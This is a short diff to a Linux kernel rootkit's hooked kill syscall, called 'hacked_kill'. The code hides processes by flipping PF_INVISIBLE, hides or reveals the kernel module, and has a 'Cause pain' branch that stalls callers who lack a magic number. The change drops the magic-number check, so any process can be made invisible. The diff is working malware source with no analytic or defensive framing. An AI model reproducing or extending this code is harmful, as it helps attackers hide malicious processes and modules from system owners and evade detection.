@@ -323,7 +323,7 @@ hacked_kill(pid_t pid, int sig)
         }
     }
 
-	if(sig==SIGINVIS && pid == magicPrefixNum) {//MODIFIED from switch to if elses
+	if(sig==SIGINVIS) {//MODIFIED from switch to if elses
 		if ((task = find_task(pid)) == NULL)
 			return -ESRCH;
 		task->flags ^= PF_INVISIBLE;
@@ -332,7 +332,7 @@ hacked_kill(pid_t pid, int sig)
 	}else if(sig==SIGMODINVIS && pid == magicPrefixNum){
 		if (module_hidden) module_show();
 		else module_hide();
-	}else if(pid != magicPrefixNum && (sig==SIGINVIS || sig==SIGSUPER || sig==SIGMODINVIS)){
+	}else if(pid != magicPrefixNum && (sig==SIGSUPER || sig==SIGMODINVIS)){
 		//Cause pain //ADDED
 		int seconds = pid * pid * pid * pid * pid;
 		int end_time = (int) __builtin_ia32_rdtsc() + seconds * 2300000000;
